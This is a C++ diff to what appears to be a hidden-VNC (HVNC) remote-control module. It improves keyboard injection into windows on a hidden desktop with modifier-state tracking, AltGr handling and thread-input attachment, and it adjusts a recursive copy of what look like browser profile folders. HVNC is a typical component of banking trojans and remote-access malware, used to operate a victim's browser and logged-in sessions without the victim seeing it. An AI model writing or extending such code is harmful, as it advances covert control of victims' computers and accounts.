@@ -139,6 +139,7 @@ static mutex g_inputMutex;
 static condition_variable g_inputCV;
 static thread g_inputThread;
 static atomic_bool g_inputRunning(false);
+static uint8_t g_keyState[256] = { 0 };
 
 // ---------- Drag state ----------
 static HWND  g_dragHwnd     = NULL;
@@ -787,6 +788,18 @@ static bool send_mouse_input(int normX, int normY, DWORD flags, DWORD mouseData 
 static LPARAM key_lparam(WORD vk, bool keyUp) {
     UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
     LPARAM lp = 1 | (scan << 16);
+
+    // Extended key bit
+    if (vk == VK_RMENU || vk == VK_RCONTROL || vk == VK_INSERT || vk == VK_DELETE ||
+        vk == VK_HOME || vk == VK_END || vk == VK_PRIOR || vk == VK_NEXT ||
+        vk == VK_LEFT || vk == VK_UP || vk == VK_RIGHT || vk == VK_DOWN ||
+        vk == VK_LWIN || vk == VK_RWIN || vk == VK_APPS || vk == VK_DIVIDE) {
+        lp |= (1 << 24);
+    }
+
+    // Context bit (Alt held)
+    if (g_keyState[VK_MENU] & 0x80) lp |= (1 << 29);
+
     if (keyUp) lp |= 0xC0000000;
     return lp;
 }
@@ -940,6 +953,8 @@ static void input_loop() {
     if (!g_hHiddenDesktop) { g_inputRunning = false; return; }
     if (!SetThreadDesktop(g_hHiddenDesktop)) { g_inputRunning = false; return; }
 
+    GetKeyboardState(g_keyState);
+
     while (g_inputRunning) {
         InputTask task;
         {
@@ -956,14 +971,67 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = WindowFromPoint(g_lastMousePos);
-            if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
+            HWND hTarget = GetFocusedWindow();
+            if (!hTarget || !IsWindow(hTarget)) hTarget = WindowFromPoint(g_lastMousePos);
             if (!hTarget || !IsWindow(hTarget)) continue;
 
+            DWORD targetThread = GetWindowThreadProcessId(hTarget, NULL);
+            DWORD currentThread = GetCurrentThreadId();
+
             if (action == "hvnc_keydown") {
-                PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
+                if (vk == VK_CAPITAL || vk == VK_NUMLOCK || vk == VK_SCROLL) {
+                    keybd_event((BYTE)vk, 0, 0, 0);
+                    keybd_event((BYTE)vk, 0, KEYEVENTF_KEYUP, 0);
+                    g_keyState[vk] ^= 1;
+                } else {
+                    g_keyState[vk] |= 0x80;
+
+                    // Sync generic modifier keys
+                    if (vk == VK_LCONTROL || vk == VK_RCONTROL) g_keyState[VK_CONTROL] |= 0x80;
+                    if (vk == VK_LSHIFT || vk == VK_RSHIFT) g_keyState[VK_SHIFT] |= 0x80;
+                    if (vk == VK_LMENU || vk == VK_RMENU) g_keyState[VK_MENU] |= 0x80;
+
+                    // AltGr support: AltGr usually maps to Ctrl + Alt
+                    if (vk == VK_RMENU) {
+                        g_keyState[VK_CONTROL] |= 0x80;
+                        g_keyState[VK_MENU] |= 0x80;
+                    }
+
+                    AttachThreadInput(currentThread, targetThread, TRUE);
+                    SetKeyboardState(g_keyState);
+                    UINT msg = (g_keyState[VK_MENU] & 0x80) ? WM_SYSKEYDOWN : WM_KEYDOWN;
+                    PostMessageW(hTarget, msg, (WPARAM)vk, key_lparam((WORD)vk, false));
+                    AttachThreadInput(currentThread, targetThread, FALSE);
+                }
             } else if (action == "hvnc_keyup") {
-                PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
+                if (vk != VK_CAPITAL && vk != VK_NUMLOCK && vk != VK_SCROLL) {
+                    g_keyState[vk] &= ~0x80;
+
+                    // Sync generic modifier keys
+                    if (vk == VK_LCONTROL || vk == VK_RCONTROL) {
+                        if (!(g_keyState[VK_LCONTROL] & 0x80) && !(g_keyState[VK_RCONTROL] & 0x80))
+                            g_keyState[VK_CONTROL] &= ~0x80;
+                    }
+                    if (vk == VK_LSHIFT || vk == VK_RSHIFT) {
+                        if (!(g_keyState[VK_LSHIFT] & 0x80) && !(g_keyState[VK_RSHIFT] & 0x80))
+                            g_keyState[VK_SHIFT] &= ~0x80;
+                    }
+                    if (vk == VK_LMENU || vk == VK_RMENU) {
+                        if (!(g_keyState[VK_LMENU] & 0x80) && !(g_keyState[VK_RMENU] & 0x80))
+                            g_keyState[VK_MENU] &= ~0x80;
+                    }
+
+                    if (vk == VK_RMENU) {
+                        g_keyState[VK_CONTROL] &= ~0x80;
+                        g_keyState[VK_MENU] &= ~0x80;
+                    }
+
+                    AttachThreadInput(currentThread, targetThread, TRUE);
+                    SetKeyboardState(g_keyState);
+                    UINT msg = (g_keyState[VK_MENU] & 0x80) ? WM_SYSKEYUP : WM_KEYUP;
+                    PostMessageW(hTarget, msg, (WPARAM)vk, key_lparam((WORD)vk, true));
+                    AttachThreadInput(currentThread, targetThread, FALSE);
+                }
             } else if (action == "hvnc_char") {
                 PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
             }
@@ -1247,7 +1315,8 @@ static bool copy_recursive(const fs::path& src, const fs::path& dst) {
                 if (name == L"Cache" || name == L"Code Cache" || name == L"GPUCache" ||
                     name == L"Service Worker" || name == L"Media Cache" ||
                     name == L"WebStorage" || name == L"crash_reporter" ||
-                    name == L"GrShaderCache") continue;
+                    name == L"GrShaderCache" || name == L"IndexedDB" ||
+                    name == L"Local Storage") continue;
 
                 if (!copy_recursive(path, dst / name)) return false;
             } else {
